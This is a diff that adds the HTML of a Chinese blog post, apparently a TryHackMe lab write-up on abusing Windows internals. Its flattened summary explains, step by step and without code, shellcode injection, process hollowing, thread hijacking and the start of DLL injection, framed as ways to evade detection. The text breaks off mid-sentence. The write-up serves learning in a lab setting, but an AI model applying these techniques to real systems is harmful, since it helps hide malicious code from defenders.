@@ -1,0 +1,2073 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-滥用Windows内部机制 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-滥用Windows内部机制"><meta name="application-name" content="THM-滥用Windows内部机制"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-滥用Windows内部机制"><meta property="og:url" content="http://hybcx.xyz/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="利用与工具无关的现代方法，利用 Windows 内部组件来逃避常见的检测解决方案。 0x01 简介 Windows 内部机制是 Windows 操作系统运作的核心，这为网络安全威胁参与者提供了一个有利可图的恶意利用目标，Windows 内部机制可被攻击者用于隐藏和执行代码、规避检测以及与其他恶意技术"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="利用与工具无关的现代方法，利用 Windows 内部组件来逃避常见的检测解决方案。 0x01 简介 Windows 内部机制是 Windows 操作系统运作的核心，这为网络安全威胁参与者提供了一个有利可图的恶意利用目标，Windows 内部机制可被攻击者用于隐藏和执行代码、规避检测以及与其他恶意技术"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    simplehomepage: false,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'hybcx',
+  title: 'THM-滥用Windows内部机制',
+  postAI: '',
+  pageFillDescription: '0x01 简介, 0x02 滥用进程(shellcode注入), 0x03 关于进程滥用的扩展(进程镂空), 0x04 滥用进程组件(线程执行劫持), 0x05 滥用DLLs(动态链接库注入), 0x06 关于内存执行的其他方案, 调用函数指针, 异步过程调用, Section Manipulation(PE节处理), 0x07 浏览器注入和钩子(Hooking)的案例研究, 0x08 总结利用与工具无关的现代方法利用内部组件来逃避常见的检测解决方案简介内部机制是操作系统运作的核心这为网络安全威胁参与者提供了一个有利可图的恶意利用目标内部机制可被攻击者用于隐藏和执行代码规避检测以及与其他恶意技术或漏洞利用程序相关联内部机制这个术语可以涵盖在操作系统后端找到的任何组件这可以包括进程文件格式组件对象模型任务调度系统等本文将重点介绍如何滥用恶意利用进程及其组件动态链接库和可移植可执行文件格式本文学习目标了解内部组件为何容易受到攻击了解如何滥用和利用内部机制漏洞了解关于内部机制滥用技术的缓解措施和检测方法将内部机制滥用技术应用于研究现实世界中的网络安全威胁模拟案例在开始学习本文相关内容之前建议读者能够对的基本用法和功能有一个大致的了解还建议读者具备关于和的基础编程知识但这不是必需的此外还需要预先阅读以下知识点文章内部机制基础红队在与本文相关的房间中为我们提供了一台基本的机器其中包含了完成本文相关操作所需的文件我们可以直接在与本文相关的房间中部署实验环境并使用给定的浏览器页面直接访问实验虚拟机或者使用以下凭据在自己的攻击机上通过访问实验虚拟机在实验房间页面中部署机器然后我们将随机获得相关的地址滥用进程注入在操作系统上运行的应用程序可以包含一个或多个进程而进程维护并代表着正在执行的程序进程具有许多其他子组件并且它们能直接与内存或虚拟内存进行交互下表简单描述了进程的每个关键组件及其用途进程组件用途私有虚拟地址空间分配给进程的虚拟内存地址可执行程序定义存储在虚拟地址空间中的代码和数据打开句柄定义进程可访问的系统资源的句柄安全上下文由访问令牌定义的用户安全组权限和其他安全信息进程标识符进程的唯一数字标识符线程计划执行的进程的一部分句柄通常指的是对资源的引用或标识而则表示这些引用当前处于打开状态所以指向的是某个程序或进程正在使用或占用的资源有关进程的详细信息请参阅内部机制基础红队进程注入通常被用作一个总括性的术语它用于描述通过合法功能或组件将恶意代码注入到进程中在本文中我们将重点介绍四种不同类型的进程注入相关概述如下所示注入类型功能作用进程镂空傀儡进程将代码注入到一个被挂起和被镂空的目标进程中线程执行劫持将代码注入到被挂起的目标线程中动态链接库注入将注入到进程内存中注入将指向恶意函数的映像自行注入到目标进程中关于一些其他形式的进程注入的概述请参考从最基本的层面上看进程注入采取的形式是注入概括性地说注入可以分为以下四个步骤打开具有所有访问权限的目标进程为分配目标进程内存将写入目标进程中已分配的内存使用远程线程执行上面的这些步骤还可以以图形化的形式进行分解以便更好地描述相关的调用是如何与进程内存进行交互的接下来我们将分解一个基本的注入器来认识注入的每个步骤并在下面进行更深入的解释在注入的第一步操作中我们需要使用特殊的参数来打开一个目标进程我们将使用来打开通过命令行提供的目标进程使用打开目标进程这将返回一个进程句柄定义访问权限此处使用表示打开的进程句柄将具有对进程的所有访问权限目标句柄不会被继承由命令行参数提供的本地进程表示打开的进程句柄将具有对进程的所有访问权限这可能是过于宽泛的权限实际应用中应根据需要选择更精确的权限表示目标句柄不会被继承到由此进程创建的子进程中这样可以确保打开的进程句柄不会被不需要的子进程继承表示由命令行参数提供的本地进程其中是命令行参数的第二个元素我们通过函数将字符串转换为整数进程然后再通过将这个整数强制转换为类型以便符合函数的参数类型命令行参数示例这样会将字符串形式的进程最终转换成类型在注入的第二步操作中我们必须根据的字节大小来分配内存内存分配将使用进行处理在调用中我们还需要使用函数来定义参数以获取要分配的字节大小表示被打开的目标进程即目标进程的句柄内存分配的区域大小保留和提交内存页面启用对已提交内存页面的执行和读写访问权限表示保留一块虚拟地址空间但不分配物理内存这允许您在将来的某个时候通过调用或来分配实际的物理内存表示分配物理内存并将其与先前保留的虚拟地址空间关联起来这样可以确保已经保留的地址空间在物理内存中有相应的存储使用的组合标志可以在分配内存时同时保留地址空间并分配实际的物理内存这通常用于将虚拟地址空间与物理内存关联起来以便在之后可以直接使用这些内存将内存页设置为既可读又可写且可执行的状态以下是函数的声明目标进程的句柄指定要分配的内存的首选地址可以为指定要分配的内存大小以字节为单位指定内存的类型和状态指定内存页的保护属性在注入的第三步操作中我们可以使用已经分配的内存区域来写入我们的通常被用于写入到内存区域表示被打开的目标进程即目标进程的句柄已经分配好的内存区域要写入的数据例如要写入的数据的字节大小目标进程的句柄表示要写入的进程在目标进程中已经通过或类似函数分配好的内存区域的起始地址要写入到目标进程内存中的数据通常是一段二进制代码如数据的字节大小即的大小可以是一个用于接收实际写入的字节数的指针但在此情况下未使用最后是注入的第四步此时我们可以控制目标进程并且我们的恶意代码也被写入到了内存中现在我们的目的是执行驻留在内存中的为此我们可以使用来通过线程控制进程的执行表示被打开的目标进程即目标进程的句柄堆栈的默认大小指向线程起始地址的指针表示创建后立即运行参数解释目标进程的句柄表示在其中创建远程线程默认安全描述符使用默认值默认堆栈大小系统将为线程提供默认的堆栈大小线程的起始地址通常是已经在远程进程分配的内存中的代码是一个指向远程进程内存中代码的指针线程的参数通常设置为线程的创建标志表示线程在被创建后立即运行线程接收新线程的标识符通常设置为这段代码使用函数在目标进程中创建一个远程线程并让该线程执行中的代码通常包含了一些能够在目标进程中执行的二进制代码例如请注意创建远程线程需要足够的权限并且最终执行的代码必须符合目标进程的架构我们可以将上述这四个步骤编译在一起以便创建一个简单的进程注入器注入是进程注入的最基本形式在本文的下一小节中我们将研究如何修改和调整上述这些注入步骤以实现进程镂空傀儡进程技术可以打开任务管理器查看可以看到用户对应的进程关于进程滥用的扩展进程镂空在上一个小节中我们讨论了如何使用注入将恶意代码注入合法进程在本小节中我们将介绍进程镂空与注入类似该技术提供了将整个恶意文件注入进程的能力这是通过镂空或取消进程的内存映射并且向进程中注入特定的可移植可执行文件数据和节来实现的概括性地说进程镂空可以分为以下六个步骤创建处于挂起状态的目标进程打开恶意映像从进程内存中取消对合法代码的映射为恶意代码分配内存位置并将每个节写入地址空间为恶意代码设置入口点使目标进程脱离挂起状态通常指的是一个包含了恶意软件病毒木马或其他恶意代码的文件这个文件可以是二进制可执行文件图像文件或其他形式的文件上面的这些步骤还可以以图形化的形式进行分解以便更好地描述相关的调用是如何与进程内存进行交互的接下来我们将分解一个基本的进程镂空注入器来认识进程镂空的每个步骤并在下面进行更深入的解释在进程镂空的第一步中我们必须使用创建一个处于挂起状态的目标进程为了获取调用所需的参数我们可以使用结构体和结构体创建一个结构体的实例用于指定新进程的启动信息定义进程的窗口站桌面句柄和外观创建一个结构体的实例用于接收有关新进程的信息有关进程和主线程的信息被声明为一个类型的变量那么就是一个指向类型结构的指针此段代码并未使用将留待下文代码段使用此处的注释提到指向上下文结构的指针可能是因为在后续操作中实际使用的是要执行的模块的名称句柄继承自调用进程新进程已经挂起指向启动信息的指针指向进程信息的指针上面这部分代码是使用中的函数来创建一个新的进程在创建进程时还将指定一些启动参数函数用于创建新进程接受多个参数包括新进程的执行模块启动信息新进程是否继承调用进程的句柄以及新进程是否在创建时挂起等是一个结构体的指针用于指定新进程的启动信息是一个结构体的指针用于接收有关新进程的信息包括新进程的句柄和主线程的句柄等如果调用失败将输出错误信息并返回在进程镂空的第二步中我们需要打开一个恶意映像来进行注入此过程又分为三个步骤首先我们需要使用来获取恶意映像的句柄获取到的映像名称只读访问权限只读共享模式指示打开文件或设备如果存在这段代码使用函数来打开一个恶意文件并获取其句柄以下是关于代码段中的参数的解释指定要打开的文件的完整路径此处的路径是访问权限表示以只读方式打开文件是一个常量它指定了读取文件的权限共享模式表示允许其他进程以只读方式共享该文件这里指定的是只读共享模式安全属性这是一个指向结构体的指针指定了安全描述符为时表示不使用安全属性打开模式表示如果文件或设备存在就打开它这里的目的是打开一个已经存在的文件模板句柄指向一个句柄表示新建文件的模板在此代码片段中因为是打开已存在的文件所以不需要模板额外的文件属性和标志这里设置为表示没有额外的特殊属性或标志当使用打开文件时这个参数通常为该代码片段的效果是打开名为的恶意文件并获取到此恶意文件的句柄这样的操作通常是想要在分析执行或进行其他文件相关操作之前先获取到文件的句柄需要注意的是对于恶意软件的处理需要谨慎确保在受控环境中进行其次在获取恶意映像的句柄后我们必须使用来将内存分配给本地进程并且还需要使用来获取恶意映像的大小恶意映像的句柄无错误返回当函数的第二个参数不为零时该参数是一个指向类型变量的指针此时函数会将文件的大小写入到指针即该参数所指向的内存位置当函数的第二个参数为零时函数将直接返回文件的大小注意在我们将函数的第二个参数设置为的情况下函数并不会因此导致错误的返回恶意映像的文件大小保留和提交内存页面启用读写访问权限这段代码用于获取恶意映像文件的大小并为其分配虚拟内存空间使用函数获取恶意映像文件的大小是之前通过打开恶意映像文件时得到的文件句柄参数表示获取文件大小时不考虑文件指针的位置直接返回整个文件的大小使用函数为恶意映像文件分配虚拟内存空间第一个参数表示让系统自动选择虚拟地址第二个参数是通过获取到的恶意映像文件的大小第三个参数是一组标志表示同时保留和提交内存页第四个参数是另一组标志表示允许对内存的读写访问权限上述代码段的目的是使用函数并且根据恶意映像文件的大小为该恶意映像分配虚拟内存空间函数将返回已分配的内存块的起始地址给这个分配虚拟内存的过程将为后续操作提供可用的内存空间最后将内存分配给本地进程之后我们还必须进行内存写入使用从前述步骤中获得的信息我们可以使用来针对本地进程内存执行写入操作存储读取的字节数恶意映像的句柄已分配的内存区域恶意映像的文件大小读取的字节数这段代码的主要功能是从指定的文件通过句柄指定中读取数据并写入到已分配的内存区域通过指定中同时记录实际读取的字节数相关解释如下声明一个类型的变量用于存储实际读取的字节数是一个位无符号整数类型用于存储位的字节数函数尝试从指定文件中读取数据恶意映像的文件句柄已分配的内存区域用于存储从文件中读取的数据文件大小指定要读取的字节数指向类型变量的指针用于接收实际读取的字节数该参数用于指定文件操作的一些特殊行为在这个特定的代码段中它被设置为这表示从文件的开头开始读取数据而不是从文件的特定位置开始读取检查函数的返回值如果返回值为非零表示读取成功则继续执行如果的返回值为零表示读取失败那么将输出错误信息并终止目标进程输出错误信息到标准输出这条语句使用对象将错误信息输出到控制台错误信息包括字符串和通过获取的具体错误代码终止目标进程这个函数调用用于立即终止所代表的目标进程参数表示终止进程时不生成错误报告从当前函数中返回值这是一个指示操作失败的标志如果操作失败则返回错误码关闭文件句柄释放相关资源整体来说这段代码的目的是将指定文件中的数据读取并写入到已分配的内存中同时记录实际读取的字节数大小函数的原型如下其中各个参数的含义如下文件句柄指向要读取的文件设备或管道用于存储读取数据的缓冲区的指针指定要读取的字节数指向一个类型变量的指针用于存储实际读取的字节数如果为则表示不获取实际读取的字节数指向一个结构的指针结构包含了异步操作的信息如果在同步操作中使用默认可以将此参数值设置为函数的返回值是一个布尔值如果函数成功则返回非零值如果函数失败则返回零可以使用函数来获取详细的相关错误信息函数可以用于同步和异步操作如果在同步操作中使用可以设置为表示使用默认的同步方式执行文件读取操作而在异步操作中需要传递一个填充了结构的指针即传递一个指向结构并已经设置了相应字段值的指针以支持异步操作结构是用于支持异步操作的结构它的定义如下这个结构包含以下成员和用于存储系统特定的信息通常用于内核通信和用于指定文件指针的偏移这两个成员合并起来形成一个位的文件指针一个事件对象的句柄用于在异步操作完成时通知应用程序当使用或其他异步函数时可以通过传递一个指向结构并已经设置了相应字段值的指针来实现在后台进行文件读取操作而不阻塞主线程异步允许应用程序在等待操作完成的同时执行其他任务而在同步操作中参数通常可设置为以使用默认的同步方式执行文件操作在进程镂空的第三步中我们的目标进程必须通过取消内存映射来实现被镂空在取消内存映射之前我们必须确定调用的参数我们需要确定进程在内存中的位置和入口点而寄存器入口点和位置包含我们需要获取的信息这些信息可以通过使用找到在我们找到刚才提及的两个寄存器之后就可以使用来从指定的地址中读取数据这个地址是通过检查进程环境块并应用偏移量得到的其中指向的指针被存储在寄存器中进程环境块是一个结构包含了许多关于进程的信息包括进程的基地址而是一个特定的偏移量对应于结构中的某个字段这个具体的偏移量是根据系统架构和操作系统版本而定的对于位操作系统而言通常结构中的字段的偏移量是这里的是一个类型的变量在本小节上文代码中已经声明过了既然被声明为一个类型的变量那么就是一个指向类型结构的指针表示仅存储寄存器从结构中获得的线程句柄指向存储检索到的上下文的指针获取当前线程上下文函数的作用上面这部分代码用于获取线程上下文信息首先这部分代码设置了标志它告诉函数只获取整数寄存器的上下文信息然后调用函数将线程句柄关联的线程的上下文信息存储在中在本小节的上文部分代码中已经定义了这个上下文信息包括了寄存器的状态而在这里我们主要关心寄存器中的值从结构体中获得的进程句柄指向基地址的指针在指向的指针存储在寄存器中上加偏移量可得到字段的地址从而获取到目标进程的基地址存储目标基地址要读取的字节数输出实际读取的字节数此处设置为实际上是在告诉函数即使成功执行读取操作也不需要返回实际读取的字节数上面这部分代码将读取目标进程的内存这部分代码使用函数从目标进程的内存中读取数据具体地它从地址处读取了字节的数据并将这些数据存储在指针所指向的内存位置是通过在指向的指针上加上偏移量得到的而则用于实现对目标进程的基地址的存储实际上是一个指向存储目标进程基地址信息的内存位置的指针通过这个指针我们可以在后续的代码中访问变量从而获取目标进程的基地址信息总体来说上面的整体代码段的作用是为了获取目标进程的基地址以便后续进行一些内存操作或注入操作存储完基址后我们可以开始取消内存映射了我们可以使用从导入的来释放目标进程的内存获取的句柄的句柄获取到的调用名称从中获取是一个函数指针指向某函数此处使用类型会比使用类型更加准确从结构体中获得的进程句柄进程的基址这段代码的主要作用是使用动态链接库的方式调用函数并使用该函数来释放目标进程的虚拟内存空间从而取消内存映射以下是相关的解释获取模块的句柄是包含了许多内部函数的动态链接库包括获取模块中函数的地址这里使用函数动态获取函数地址以便后续调用使用获取到的函数地址调用该函数从而取消目标进程中以为基地址的虚拟内存区域的映射此处将使用函数指针来实现对于函数的调用是目标进程的句柄是虚拟内存的基地址这段代码的目的是通过动态链接库调用函数来释放目标进程的虚拟内存空间从而实现取消内存映射的操作注意使用内部函数和进行操作时需要谨慎因为这可能会导致系统不稳定而且相关的代码可能会受到不同的版本影响在进程镂空的第四步中我们首先应该在已经被镂空的进程中为恶意映像分配内存我们可以使用来分配内存此时我们需要获取在文件头中找到的映像大小可以被用于确认从头到头的字节数一旦到达头我们就可以从可选标头中获取到从恶意映像中获取头通过获取标头标头是文件头的开始部分在文件中标头紧随头之后它标志着文件的起始位置从标头结构中获取可选标头的字段这段代码主要用于在目标进程中分配内存以便用于恶意映像替换获取头和头这一行代码将转换为类型的指针以获取指向头的指针这一行代码使用头中的字段获取头的偏移量然后将的字节指针加上这个偏移量得到指向头的指针获取恶意映像的大小通过访问头中的结构获取恶意映像的大小信息并将该信息存储在变量中在目标进程中为恶意映像分配内存目标进程的句柄从结构中获取进程的基地址从可选头中获取的字节大小保留并提交内存页面启用执行和读写权限使用函数在目标进程中分配内存变量将存储已分配的内存的基地址总体而言这段代码用于获取恶意映像的大小并在目标进程中分配足够的内存以便用于恶意映像替换一旦分配好了内存我们就可以将恶意文件写入到目标进程的内存中因为我们正在写入文件所以我们必须先写头然后再写节为了向目标进程的内存中写入头我们可以使用以及标头的大小来确定在何处停止写入从结构中获得的进程句柄进程的基地址恶意文件所在的本地内存标头的总字节大小这段代码使用了函数用于将可移植可执行文件的标头写入目标进程让我们逐个分析函数调用的参数这是从结构中获取的指向目标进程的句柄它表示将要写入内存的目标进程这是目标进程中数据将被写入的基址通常是目标进程中映像的基址此参数表示恶意文件所在的本地内存这是将要从中复制数据以便写入到目标进程内存的源缓冲区这是标头的字节大小它指定了要从源缓冲区写入到目标进程内存的字节数最后一个参数表示实际写入的字节数由于设置为在函数返回将不提供相关信息语句将检查函数的返回值如果返回表示失败则使用获取与失败相关联的错误代码并打印错误消息总的来说这段代码尝试将文件的头部从本地内存写入到目标进程中的指定内存位置如果操作失败将打印错误消息请注意此类代码片段通常出现在与进程注入或代码注入技术相关的代码中这经常被恶意软件用于恶意目的现在我们需要继续向目标进程的内存中写入每个节我们可以使用标头中的字段来查找节的数量并且根据和当前标头的大小来通过循环遍历写入每个恶意的节基于数据中节数的循环确定当前的节标头从结构中获得的进程句柄目标进程的内存空间中用于放置循环中当前节的基址指向循环中当前节内容的指针循环中当前节的字节大小这段代码通过循环遍历恶意文件的各个节并使用函数将每个节的内容写入到目标进程的指定位置让我们逐步分析代码这是一个循环从开始循环次数为文件头中记录的节的数量这个循环将遍历文件中的所有节这段代码主要是用于获取文件中第个节的标头信息让我们逐步解析这段代码是指向恶意文件在本地内存中的起始位置的指针强制转换类型为表示这个指针是指向字节数据的是指向头的指针是头中的一个字段表示头的偏移量这个值告诉操作系统在文件中找到头的位置结构体存储了文件的头信息加上这个值是为了跳过头从而到达恶意文件中的第一个节标头乘以是为了移动到特定索引处的节标头位置表示一个节标头的大小最终整个表达式的结果将被强制转换为类型这表示取得的指针将指向一个结构体即指向第个节的标头在循环体内使用函数将源文件中的一个节的内容写入到目标进程的指定地址让我们逐步解析这段代码这是目标进程的句柄表示将要写入数据的目标进程这是目标进程中用于放置循环中当前节的基地址存储的是目标进程中用于放置将要注入的恶意文件的空间的基地址表示源文件中当前节的虚拟地址通过加上就可以确定循环中当前源节将要被写入到目标进程中的什么位置这是源文件中指向循环中当前节的内容的指针是源文件在本地内存中的起始位置表示循环中当前节在源文件中的偏移量通过这两者相加可以确定将要写入的循环中当前节的来源位置这是当前节在源文件中的大小以字节为单位它表示要从源文件中写入到目标进程中的字节数总体而言这段代码的作用是将源文件恶意文件中的各个节的内容通过函数注入到目标进程的指定位置这是一种典型的进程注入技术用于将恶意代码或其他可执行代码加载到目标进程的内存中在中函数的声明如下以下是关于函数的各个参数的简要说明目标进程的句柄表示要写入数据的进程要写入数据的目标进程中的起始地址要写入到目标进程的源数据的指针要写入的数据的字节数一个可选的指针用于接收实际写入的字节数为时表示不关心实际写入的字节数返回值如果函数执行成功返回非零值如果函数执行失败则返回零同时还可以通过调用函数来获取更多的错误信息此外我们也可以使用重定位表来将文件数据写入目标内存这将在本文的第六小节中进行更深入的讨论在进程镂空的第五步中我们可以使用来更改以设置指向恶意代码的入口点将上下文结构指针设置为指向恶意的可选标头中的入口点是目标进程中用于放置将要注入的恶意数据的内存空间的基地址表示将转换为类型即得到一个字节型指针这是因为我们希望以字节为单位进行地址偏移是一个指向目标进程中头部信息标头它是文件头的开始部分的指针是在文件头部的中的一个字段将获取标头的中的入口点相对于文件起始位置的偏移量将字节型指针与偏移量相加然后将结果转换为类型这将得出目标进程中恶意代码的入口点的实际地址从结构中获得的线程句柄指向已存储的线程上下文结构的指针在进程镂空的第六步中我们需要使用来使目标进程脱离挂起状态从结构中获得的线程句柄我们可以将上述这些步骤编译在一起来创建一个进程镂空注入器并使用由本文实验环境所提供的注入器来进行进程镂空实验滥用进程组件线程执行劫持概括性地说线程执行劫持可以分为以下十个步骤找到并打开要控制的目标进程在目标进程中为恶意代码分配内存区域将恶意代码写入已分配的内存中确认要劫持的目标线程的线程打开目标线程挂起目标线程获取线程的上下文更新指令指针以指向恶意代码重写目标线程上下文恢复被劫持的线程接下来我们将分解一个基本的线程劫持脚本来认识线程劫持的每个步骤并在下面进行更深入地解释该技术的前三个步骤将遵循与正常的进程注入类似的常见操作我们在本节中不作过多的解释参考上文内容即可相关源代码如下所示找到并打开要控制的目标进程请求所有可能的访问权限子进程不继承父进程句柄已存储的进程为恶意代码分配内存区域表示被打开的目标进程即目标进程的句柄内存分配的区域大小保留和提交内存页面启用对已提交内存页面的执行和读写访问权限将恶意代码写入已分配的内存被打开的目标进程已分配的内存区域要写入的数据要写入的数据的大小在完成与上述代码段相关的步骤并且我们的也已经被写入到指定内存后我们就可以进入线程劫持的第四步在第四步中我们需要通过确认线程以开始劫持目标进程的线程为了确认目标线程我们需要使用三个调用和这些调用将共同地循环遍历线程快照并能实现枚举线程的功能请查看官方相关文档以便更好地理解此处的三个调用定义一个结构体变量用于存储线程的信息为指定的进程线程创建快照在快照中包含驻留在系统中的所有线程要包含在快照中的进程的进程标识符为零时指示当前进程获取快照中的第一个线程快照句柄指向结构的指针用于存储第一个线程的信息获取快照中的下一个线程快照句柄指向结构的指针用于存储下一个线程的信息这段代码使用了中的进程和线程遍历函数主要目的是获取系统中所有线程的信息以下是代码的分析定义了一个名为的结构体用于存储线程信息创建一个包含进程线程的快照是一个用于获取系统信息的函数此处使用参数表示获取系统中所有线程的快照而表示获取当前进程的快照通过函数获取第一个线程的信息该函数将填充传递给它的结构体即通过函数在快照中获取下一个线程的信息该循环会一直执行直到没有更多的线程信息可用接下来是线程劫持的第五步我们已经在结构体指针中收集了所有需要的信息现在可以打开目标线程了为此我们将使用来处理我们用于存储线程信息的结构体指针验证两个父进程是否匹配如果找到符合条件的线程则打开该线程的句柄请求所有可能的访问权限子线程不继承父线程的句柄从结构体指针中读取线程中断循环不再继续遍历其他线程这段代码的目的是根据给定的进程查找具有相同父进程的线程并打开该线程的句柄具体分析如下通过比较结构体中的线程拥有者的进程和给定的进程是否匹配来判断是否找到了目标线程这个条件确保了只有当某个线程的父进程匹配到给定的进程时才会执行后续的操作如果找到了符合条件的线程就使用函数来打开该线程的句柄这个函数的参数包括请求对线程的所有可能的访问权限表示子线程不继承父线程的句柄从结构体中获取线程找到符合条件的线程后中断循环不再继续遍历其他线程总体而言这段代码的作用是在系统中查找具有指定父进程的线程并打开找到的第一个匹配的线程的句柄在线程劫持的第六步中我们必须挂起打开的目标线程要挂起目标线程我们可以使用使目标线程进入暂停状态停止执行目标线程中的指令在线程劫持的第七步中我们需要获取目标线程的上下文信息以便在即将进行的调用中使用这可以通过使用并存储指针来完成目标线程的句柄指向存储上下文结构的指针这段代码使用了函数来获取指定线程的上下文信息以下是对这段代码的分析定义了一个结构体变量用于存储线程的上下文信息结构体包含了关于线程状态的各种信息例如寄存器值标志位等调用了函数该函数的目的是获取指定线程的上下文信息具体参数如下这是一个类型的变量表示目标线程的句柄这是一个指向结构体的指针用于存储获取到的线程上下文信息通过调用可以获取目标线程的当前状态包括寄存器的值标志位等信息这在某些情况下比如线程调试异常处理等场景中是非常有用的获取线程上下文信息通常是为了进一步分析线程的状态诊断问题或实现特定的功能在线程劫持的第八步中我们需要覆写指令指针寄存器以指向我们的恶意内存区域是一个寄存器它将确定下一条代码指令简而言之它控制着内存中应用程序的流程为了覆写此寄存器我们可以更新目标线程上下文中的信息将指向我们为恶意代码分配的内存区域这段代码的目的是将线程的指令指针寄存器设置为一个特定的内存地址即将其指向一个为恶意代码分配的缓冲区具体分析如下这行代码将结构体中的成员即指令指针寄存器的值设置为这样做的效果是将线程的执行流指向了所代表的内存地址将的地址转换为类型从而确保结构体成员所接受的是一个合适的地址值接下来是线程劫持的第九步我们需要将当前上下文更新为目标线程的上下文使用和上下文指针可以轻松完成此操作目标线程的句柄指向上下文结构的指针最后是线程劫持的第十步我们需要让目标线程脱离挂起状态这可以通过使用来完成目标线程的句柄我们可以将上述这些步骤编译在一起以创建一个通过线程劫持来完成注入的进程注入器并使用由本文实验环境所提供的注入器来尝试进行线程劫持实验滥用动态链接库注入可参考文章概括性地说注入可以分为以下五个步骤找到要注入的目标进程打开目标进程在进程中为